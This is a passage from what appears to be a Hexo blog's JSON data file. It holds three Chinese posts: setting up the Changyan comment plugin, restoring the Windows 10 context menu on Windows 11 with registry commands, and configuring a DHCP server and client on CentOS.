fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"搭建原因\"><a href=\"#搭建原因\" class=\"headerlink\" title=\"搭建原因\"></a>搭建原因</h3><p>之前在博客搭建了评论的板块，但是因为使用的是gitalk的评论功能，如果访客要进行评论的话，首先必须拥有一个github的账号，但绝大多数人如果不做这一行，不向开发靠拢，就很大程度上没有github的账号。基于这样的原因，我又重新寻找评论的插件，终于找到了适合国人的评论插件“畅言”。畅言是支持手机号、QQ账号、微信账号登录使用的，很符合我的需求，于是简单了解了一下搭建的方法，在这里分享给大家。</p>\n<h3 id=\"条件准备\"><a href=\"#条件准备\" class=\"headerlink\" title=\"条件准备\"></a>条件准备</h3><ol>\n<li>使用畅言评论，我们首先要去<a href=\"https://changyan.kuaizhan.com/\">畅言评论官网</a>注册一个账号。</li>\n</ol>","more":"<p>紧接着我们需要添加一个站点，按照要求来就OK。站点名称随便输入，网址是你的网站的域名，白名单选填，直接跳过就OK，站点类型按照下拉框选择就好，网站logo有就添加，没有可以不添加。总的来讲，只有站点网站这一个框比较重要。</p>\n<p><img src=\"/2023/07/17/changyan-comment/1.png\" alt=\"添加站点\"></p>\n<ol start=\"2\">\n<li>找到ID和SECRET。</li>\n</ol>\n<p>注册好之后，在后台总览可以找到这两个参数，这两个参数待会还有别的用处。</p>\n<p><img src=\"/2023/07/17/changyan-comment/2.png\" alt=\"添加站点\"></p>\n<ol start=\"3\">\n<li>修改NEXT的主题配置文件。</li>\n</ol>\n<p>将comment的active值修改为changyan。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">comments:</span><br><span class=\"line\">  <span class=\"comment\"># Available values: tabs | buttons</span></span><br><span class=\"line\">  style: tabs</span><br><span class=\"line\">  <span class=\"comment\"># Choose a comment system to be displayed by default.</span></span><br><span class=\"line\">  <span class=\"comment\"># Available values: disqus | disqusjs | changyan | livere | gitalk | utterances</span></span><br><span class=\"line\">  active: changyan</span><br></pre></td></tr></table></figure>\n\n<p>然后进行changyan的主配置修改，将enable值改为true，下面的appid和appkey对应畅言官网的APP ID和APP SECRET。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">changyan:</span><br><span class=\"line\">  <span class=\"built_in\">enable</span>: <span class=\"literal\">true</span> <span class=\"comment\"># false</span></span><br><span class=\"line\">  appid: c*******s</span><br><span class=\"line\">  appkey: 48a****b8**2328cd*****ab****50d7</span><br><span class=\"line\">  <span class=\"comment\"># Show comments count</span></span><br><span class=\"line\">  count: <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n\n<p>修改完成后，可以在博客上看到畅言评论的评论区了，如下图所示：</p>\n<p><img src=\"/2023/07/17/changyan-comment/3.png\" alt=\"添加站点\"></p>\n<ol start=\"4\">\n<li>对评论区的功能进行更多的设置。</li>\n</ol>\n<p>可以在主页系统设置的通用设置里设置审核规则，是否允许用图片进行评论，官方回复使用的昵称和头像。</p>\n<p><img src=\"/2023/07/17/changyan-comment/4.png\" alt=\"添加站点\"></p>\n<p>可以在主页系统设置的PC版设置里的显示配置，进行评论区的显示配置。</p>\n<p><img src=\"/2023/07/17/changyan-comment/5.png\" alt=\"添加站点\"></p>\n<p>还可以设置主题的样式。</p>\n<p><img src=\"/2023/07/17/changyan-comment/6.png\" alt=\"添加站点\"></p>"},{"title":"Win11切换Win10经典右击菜单栏","date":"2023-07-21T00:19:04.000Z","_content":"\n相信有不少升级为Win11的小伙伴对Win11的折叠右击菜单非常不舒服，平常只需要一次右击的事情，现在还要展开更多，再去找需要的工具。非常影响使用体验，接下来，告诉大家不用下载任何第三方软件，也不用手动修改注册表，只需要执行两条命令就会自动修改注册表的方法。\n\n### 切换Win10经典右击菜单栏\n\n<kbd>Win</kbd>+<kbd>R</kbd>，输入`cmd`回车，紧接着复制并执行下面两条命令。\n\n<!-- more -->\n\n```bash\nreg add \"HKCU\\Software\\Classes\\CLSID\\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\\InprocServer32\" /f /ve\n```\n\n```bash\ntaskkill /f /im explorer.exe & start explorer.exe\n```\n\n### 恢复Win11右击菜单栏\n\n既然可以切换到Win10的菜单栏，那自然也可以恢复为Win11的菜单栏。同样的，<kbd>Win</kbd>+<kbd>R</kbd>，输入`cmd`回车，紧接着复制并执行下面两条命令。\n\n```bash\nreg delete \"HKCU\\Software\\Classes\\CLSID\\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\" /f\n```\n\n```bash\ntaskkill /f /im explorer.exe & start explorer.exe\n```","source":"_posts/classic-menu.md","raw":"---\ntitle: Win11切换Win10经典右击菜单栏\ndate: 2023-07-21 08:19:04\ncategories: 小玩意儿\ntags:\n  - Windows\n---\n\n相信有不少升级为Win11的小伙伴对Win11的折叠右击菜单非常不舒服，平常只需要一次右击的事情，现在还要展开更多，再去找需要的工具。非常影响使用体验，接下来，告诉大家不用下载任何第三方软件，也不用手动修改注册表，只需要执行两条命令就会自动修改注册表的方法。\n\n### 切换Win10经典右击菜单栏\n\n<kbd>Win</kbd>+<kbd>R</kbd>，输入`cmd`回车，紧接着复制并执行下面两条命令。\n\n<!-- more -->\n\n```bash\nreg add \"HKCU\\Software\\Classes\\CLSID\\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\\InprocServer32\" /f /ve\n```\n\n```bash\ntaskkill /f /im explorer.exe & start explorer.exe\n```\n\n### 恢复Win11右击菜单栏\n\n既然可以切换到Win10的菜单栏，那自然也可以恢复为Win11的菜单栏。同样的，<kbd>Win</kbd>+<kbd>R</kbd>，输入`cmd`回车，紧接着复制并执行下面两条命令。\n\n```bash\nreg delete \"HKCU\\Software\\Classes\\CLSID\\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\" /f\n```\n\n```bash\ntaskkill /f /im explorer.exe & start explorer.exe\n```","slug":"classic-menu","published":1,"updated":"2024-05-03T03:55:54.833Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5f2004o7zj31qngg725","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>相信有不少升级为Win11的小伙伴对Win11的折叠右击菜单非常不舒服，平常只需要一次右击的事情，现在还要展开更多，再去找需要的工具。非常影响使用体验，接下来，告诉大家不用下载任何第三方软件，也不用手动修改注册表，只需要执行两条命令就会自动修改注册表的方法。</p>\n<h3 id=\"切换Win10经典右击菜单栏\"><a href=\"#切换Win10经典右击菜单栏\" class=\"headerlink\" title=\"切换Win10经典右击菜单栏\"></a>切换Win10经典右击菜单栏</h3><p><kbd>Win</kbd>+<kbd>R</kbd>，输入<code>cmd</code>回车，紧接着复制并执行下面两条命令。</p>\n<span id=\"more\"></span>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">reg add <span class=\"string\">&quot;HKCU\\Software\\Classes\\CLSID\\&#123;86ca1aa0-34aa-4e8b-a509-50c905bae2a2&#125;\\InprocServer32&quot;</span> /f /ve</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">taskkill /f /im explorer.exe &amp; start explorer.exe</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"恢复Win11右击菜单栏\"><a href=\"#恢复Win11右击菜单栏\" class=\"headerlink\" title=\"恢复Win11右击菜单栏\"></a>恢复Win11右击菜单栏</h3><p>既然可以切换到Win10的菜单栏，那自然也可以恢复为Win11的菜单栏。同样的，<kbd>Win</kbd>+<kbd>R</kbd>，输入<code>cmd</code>回车，紧接着复制并执行下面两条命令。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">reg delete <span class=\"string\">&quot;HKCU\\Software\\Classes\\CLSID\\&#123;86ca1aa0-34aa-4e8b-a509-50c905bae2a2&#125;&quot;</span> /f</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">taskkill /f /im explorer.exe &amp; start explorer.exe</span><br></pre></td></tr></table></figure>","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<p>相信有不少升级为Win11的小伙伴对Win11的折叠右击菜单非常不舒服，平常只需要一次右击的事情，现在还要展开更多，再去找需要的工具。非常影响使用体验，接下来，告诉大家不用下载任何第三方软件，也不用手动修改注册表，只需要执行两条命令就会自动修改注册表的方法。</p>\n<h3 id=\"切换Win10经典右击菜单栏\"><a href=\"#切换Win10经典右击菜单栏\" class=\"headerlink\" title=\"切换Win10经典右击菜单栏\"></a>切换Win10经典右击菜单栏</h3><p><kbd>Win</kbd>+<kbd>R</kbd>，输入<code>cmd</code>回车，紧接着复制并执行下面两条命令。</p>","more":"<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">reg add <span class=\"string\">&quot;HKCU\\Software\\Classes\\CLSID\\&#123;86ca1aa0-34aa-4e8b-a509-50c905bae2a2&#125;\\InprocServer32&quot;</span> /f /ve</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">taskkill /f /im explorer.exe &amp; start explorer.exe</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"恢复Win11右击菜单栏\"><a href=\"#恢复Win11右击菜单栏\" class=\"headerlink\" title=\"恢复Win11右击菜单栏\"></a>恢复Win11右击菜单栏</h3><p>既然可以切换到Win10的菜单栏，那自然也可以恢复为Win11的菜单栏。同样的，<kbd>Win</kbd>+<kbd>R</kbd>，输入<code>cmd</code>回车，紧接着复制并执行下面两条命令。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">reg delete <span class=\"string\">&quot;HKCU\\Software\\Classes\\CLSID\\&#123;86ca1aa0-34aa-4e8b-a509-50c905bae2a2&#125;&quot;</span> /f</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">taskkill /f /im explorer.exe &amp; start explorer.exe</span><br></pre></td></tr></table></figure>"},{"title":"Linux配置DHCP服务器","date":"2023-07-27T05:47:58.000Z","_content":"\n关于DHCP的配置是在很久之前学习配置的，并没有整理成册，今天闲下心来再把关于DHCP配置的方法回顾一下。\n\n### DHCP配置流程\n\n1. 下载软件包\n\n```bash\nyum install -y dhcp-server\n```\n\n从Centos8开始，关于DHCP的配置，软件包就变成了“dhcp-server”这是服务器端的软件包，与此相对应的还有客户端使用的“dhcp-client”。\n\n<!-- more -->\n\n2. 复制配置文件\n\ndhcp的配置文件是`/etc/dhcp/dhcpd.conf`，但是比较鸡肋的是，这个配置文件是空的，只有三行注释，但是dhcp提供了一个模板文件`/usr/share/doc/dhcp-server/dhcpd.conf.example`，可以直接拷贝过去使用。\n\n因为配置文件有很多注释，看起来非常杂乱，所以执行以下这条命令，直接带走所有注释。\n\n```bash\negrep -v \"^#|^$\" /usr/share/doc/dhcp-server/dhcpd.conf.example > /etc/dhcp/dhcpd.conf\n```\n\n3. 配置文件内容及含义\n\n```bash\n# 定义全局参数：默认搜索域\noption domain-name \"blog.nustarain.com\";\n# 定义全局参数：域名服务器（若是多个域名服务器使用逗号间隔）\noption domain-name-servers ns1.nustarain.com;\n# 定义全局参数：默认租期\ndefault-lease-time 600;\n# 定义全局参数。最大租期\nmax-lease-time 7200;\nlog-facility local7;\n# 定义网络号为10.8.7.0子网掩码为255.255.255.0的子网\nsubnet 10.8.7.0 netmask 255.255.255.0 {\n  # 子网IP地址池的范围\n  range 10.8.7.10 10.8.7.253;\n  # 设置子网的默认网关\n  option routers 10.8.7.254;\n  # 设置子网的广播地址\n  option broadcast-address 10.8.7.255;\n  default-lease-time 600;\n  max-lease-time 7200;\n}\n# 向特殊主机分配特定的IP，当要给多个特殊的主机分配IP时，host 后的名称要求必须唯一\nhost fantasia {\n  # 指定主机的MAC地址\n  hardware ethernet 00:0c:29:af:33:58;\n  # 指定要分配的IP地址\n  fixed-address 10.8.7.68;\n}\n```\n\n在整个DHCP的配置中，要注意DHCP配置文件的语法规则，尤其是分号的使用，稍不留神就会报错。\n配置完配置文件之后，可以使用`dhcpd -t`来进行语法检查，出现下面的语句表示没有错误，反之就要检查错误了。\n\n```bash\nInternet Systems Consortium DHCP Server 4.3.6\nCopyright 2004-2017 Internet Systems Consortium.\nAll rights reserved.\nFor info, please visit https://www.isc.org/software/dhcp/\nldap_gssapi_principal is not set,GSSAPI Authentication for LDAP will not be used\nNot searching LDAP since ldap-server, ldap-port and ldap-base-dn were not specified in the config file\nConfig file: /etc/dhcp/dhcpd.conf\nDatabase file: /var/lib/dhcpd/dhcpd.leases\nPID file: /var/run/dhcpd.pid\nSource compiled to use binary-leases\n```\n\nPlease remember：Practice makes perfect.\n\n### 客户机获取IP地址\n\n相比服务器端的配置，客户机的操作就比较简单一点。\n\n1. 下载软件包。\n\n```bash\nyum install -y dhcp-client\n```\n\n2. （可选），如果当前网卡已经是动态获取的模式，那么就不需要改配置文件了，如果网卡是静态指定的，那么就需要修改一下。网卡配置文件路径`/etc/sysconfig/network-scripts/ifcfg-ens160`，修改里面的`BOOTPROTO=dhcp`，保存退出。\n\n3. 执行命令更新重启网卡。\n\n```bash\nsystemctl restart NetworkManager\nnmcli c d ens160\nnmcli c up ens160\n```\n\n4. 相关命令。\n\n```bash\ndhclient ens160    # 自动获取IP地址\ndhclient -r ens160    # 释放当前IP\n```","source":"_posts/conf-dhcp.md","raw":"---\ntitle: Linux配置DHCP服务器\ndate: 2023-07-27 13:47:58\ncategories: 技术\ntags:\n  - Linux\n---\n\n关于DHCP的配置是在很久之前学习配置的，并没有整理成册，今天闲下心来再把关于DHCP配置的方法回顾一下。\n\n### DHCP配置流程\n\n1. 下载软件包\n\n```bash\nyum install -y dhcp-server\n```\n\n从Centos8开始，关于DHCP的配置，软件包就变成了“dhcp-server”这是服务器端的软件包，与此相对应的还有客户端使用的“dhcp-client”。\n\n<!-- more -->\n\n2. 复制配置文件\n\ndhcp的配置文件是`/etc/dhcp/dhcpd.conf`，但是比较鸡肋的是，这个配置文件是空的，只有三行注释，但是dhcp提供了一个模板文件`/usr/share/doc/dhcp-server/dhcpd.conf.example`，可以直接拷贝过去使用。\n\n因为配置文件有很多注释，看起来非常杂乱，所以执行以下这条命令，直接带走所有注释。\n\n```bash\negrep -v \"^#|^$\" /usr/share/doc/dhcp-server/dhcpd.conf.example > /etc/dhcp/dhcpd.conf\n```\n\n3. 配置文件内容及含义\n\n```bash\n# 定义全局参数：默认搜索域\noption domain-name \"blog.nustarain.com\";\n# 定义全局参数：域名服务器（若是多个域名服务器使用逗号间隔）\noption domain-name-servers ns1.nustarain.com;\n# 定义全局参数：默认租期\ndefault-lease-time 600;\n# 定义全局参数。最大租期\nmax-lease-time 7200;\nlog-facility local7;\n# 定义网络号为10.8.7.0子网掩码为255.255.255.0的子网\nsubnet 10.8.7.0 netmask 255.255.255.0 {\n  # 子网IP地址池的范围\n  range 10.8.7.10 10.8.7.253;\n  # 设置子网的默认网关\n  option routers 10.8.7.254;\n  # 设置子网的广播地址\n  option broadcast-address 10.8.7.255;\n  default-lease-time 600;\n  max-lease-time 7200;\n}\n# 向特殊主机分配特定的IP，当要给多个特殊的主机分配IP时，host 后的名称要求必须唯一\nhost fantasia {\n  # 指定主机的MAC地址\n  hardware ethernet 00:0c:29:af:33:58;\n  # 指定要分配的IP地址\n  fixed-address 10.8.7.68;\n}\n```\n\n在整个DHCP的配置中，要注意DHCP配置文件的语法规则，尤其是分号的使用，稍不留神就会报错。\n配置完配置文件之后，可以使用`dhcpd -t`来进行语法检查，出现下面的语句表示没有错误，反之就要检查错误了。\n\n```bash\nInternet Systems Consortium DHCP Server 4.3.6\nCopyright 2004-2017 Internet Systems Consortium.\nAll rights reserved.\nFor info, please visit https://www.isc.org/software/dhcp/\nldap_gssapi_principal is not set,GSSAPI Authentication for LDAP will not be used\nNot searching LDAP since ldap-server, ldap-port and ldap-base-dn were not specified in the config file\nConfig file: /etc/dhcp/dhcpd.conf\nDatabase file: /var/lib/dhcpd/dhcpd.leases\nPID file: /var/run/dhcpd.pid\nSource compiled to use binary-leases\n```\n\nPlease remember：Practice makes perfect.\n\n### 客户机获取IP地址\n\n相比服务器端的配置，客户机的操作就比较简单一点。\n\n1. 下载软件包。\n\n```bash\nyum install -y dhcp-client\n```\n\n2. （可选），如果当前网卡已经是动态获取的模式，那么就不需要改配置文件了，如果网卡是静态指定的，那么就需要修改一下。网卡配置文件路径`/etc/sysconfig/network-scripts/ifcfg-ens160`，修改里面的`BOOTPROTO=dhcp`，保存退出。\n\n3. 执行命令更新重启网卡。\n\n```bash\nsystemctl restart NetworkManager\nnmcli c d ens160\nnmcli c up ens160\n```\n\n4. 相关命令。\n\n```bash\ndhclient ens160    # 自动获取IP地址\ndhclient -r ens160    # 释放当前IP\n```","slug":"conf-dhcp","published":1,"updated":"2024-05-03T03:55:54.833Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5f4004r7zj36mm1ds5m","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>关于DHCP的配置是在很久之前学习配置的，并没有整理成册，今天闲下心来再把关于DHCP配置的方法回顾一下。</p>\n<h3 id=\"DHCP配置流程\"><a href=\"#DHCP配置流程\" class=\"headerlink\" title=\"DHCP配置流程\"></a>DHCP配置流程</h3><ol>\n<li>下载软件包</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y dhcp-server</span><br></pre></td></tr></table></figure>\n\n<p>从Centos8开始，关于DHCP的配置，软件包就变成了“dhcp-server”这是服务器端的软件包，与此相对应的还有客户端使用的“dhcp-client”。</p>\n<span id=\"more\"></span>\n\n<ol start=\"2\">\n<li>复制配置文件</li>\n</ol>\n<p>dhcp的配置文件是<code>/etc/dhcp/dhcpd.conf</code>，但是比较鸡肋的是，这个配置文件是空的，只有三行注释，但是dhcp提供了一个模板文件<code>/usr/share/doc/dhcp-server/dhcpd.conf.example</code>，可以直接拷贝过去使用。</p>\n<p>因为配置文件有很多注释，看起来非常杂乱，所以执行以下这条命令，直接带走所有注释。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">egrep -v <span class=\"string\">&quot;^#|^$&quot;</span> /usr/share/doc/dhcp-server/dhcpd.conf.example &gt; /etc/dhcp/dhcpd.conf</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>配置文件内容及含义</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 定义全局参数：默认搜索域</span></span><br><span class=\"line\">option domain-name <span class=\"string\">&quot;blog.nustarain.com&quot;</span>;</span><br><span class=\"line\"><span class=\"comment\"># 定义全局参数：域名服务器（若是多个域名服务器使用逗号间隔）</span></span><br><span class=\"line\">option domain-name-servers ns1.nustarain.com;</span><br><span class=\"line\"><span class=\"comment\"># 定义全局参数：默认租期</span></span><br><span class=\"line\">default-lease-time 600;</span><br><span class=\"line\"><span class=\"comment\"># 定义全局参数。最大租期</span></span><br><span class=\"line\">max-lease-time 7200;</span><br><span class=\"line\">log-facility local7;</span><br><span class=\"line\"><span class=\"comment\"># 定义网络号为10.8.7.0子网掩码为255.255.255.0的子网</span></span><br><span class=\"line\">subnet 10.8.7.0 netmask 255.255.255.0 &#123;</span><br><span class=\"line\">  <span class=\"comment\"># 子网IP地址池的范围</span></span><br><span class=\"line\">  range 10.8.7.10 10.8.7.253;</span><br><span class=\"line\">  <span class=\"comment\"># 设置子网的默认网关</span></span><br><span class=\"line\">  option routers 10.8.7.254;</span><br><span class=\"line\">  <span class=\"comment\"># 设置子网的广播地址</span></span><br><span class=\"line\">  option broadcast-address 10.8.7.255;</span><br><span class=\"line\">  default-lease-time 600;</span><br><span class=\"line\">  max-lease-time 7200;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\"># 向特殊主机分配特定的IP，当要给多个特殊的主机分配IP时，host 后的名称要求必须唯一</span></span><br><span class=\"line\">host fantasia &#123;</span><br><span class=\"line\">  <span class=\"comment\"># 指定主机的MAC地址</span></span><br><span class=\"line\">  hardware ethernet 00:0c:29:af:33:58;</span><br><span class=\"line\">  <span class=\"comment\"># 指定要分配的IP地址</span></span><br><span class=\"line\">  fixed-address 10.8.7.68;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在整个DHCP的配置中，要注意DHCP配置文件的语法规则，尤其是分号的使用，稍不留神就会报错。<br>配置完配置文件之后，可以使用<code>dhcpd -t</code>来进行语法检查，出现下面的语句表示没有错误，反之就要检查错误了。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Internet Systems Consortium DHCP Server 4.3.6</span><br><span class=\"line\">Copyright 2004-2017 Internet Systems Consortium.</span><br><span class=\"line\">All rights reserved.</span><br><span class=\"line\">For info, please visit https://www.isc.org/software/dhcp/</span><br><span class=\"line\">ldap_gssapi_principal is not <span class=\"built_in\">set</span>,GSSAPI Authentication <span class=\"keyword\">for</span> LDAP will not be used</span><br><span class=\"line\">Not searching LDAP since ldap-server, ldap-port and ldap-base-dn were not specified <span class=\"keyword\">in</span> the config file</span><br><span class=\"line\">Config file: /etc/dhcp/dhcpd.conf</span><br><span class=\"line\">Database file: /var/lib/dhcpd/dhcpd.leases</span><br><span class=\"line\">PID file: /var/run/dhcpd.pid</span><br><span class=\"line\">Source compiled to use binary-leases</span><br></pre></td></tr></table></figure>\n\n<p>Please remember：Practice makes perfect.</p>\n<h3 id=\"客户机获取IP地址\"><a href=\"#客户机获取IP地址\" class=\"headerlink\" title=\"客户机获取IP地址\"></a>客户机获取IP地址</h3><p>相比服务器端的配置，客户机的操作就比较简单一点。</p>\n<ol>\n<li>下载软件包。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y dhcp-client</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li><p>（可选），如果当前网卡已经是动态获取的模式，那么就不需要改配置文件了，如果网卡是静态指定的，那么就需要修改一下。网卡配置文件路径<code>/etc/sysconfig/network-scripts/ifcfg-ens160</code>，修改里面的<code>BOOTPROTO=dhcp</code>，保存退出。</p>\n</li>\n<li><p>执行命令更新重启网卡。</p>\n</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl restart NetworkManager</span><br><span class=\"line\">nmcli c d ens160</span><br><span class=\"line\">nmcli c up ens160</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>相关命令。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dhclient ens160    <span class=\"comment\"># 自动获取IP地址</span></span><br><span class=\"line\">dhclient -r ens160    <span class=\"comment\"># 释放当前IP</span></span><br></pre></td></tr></table></figure>","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  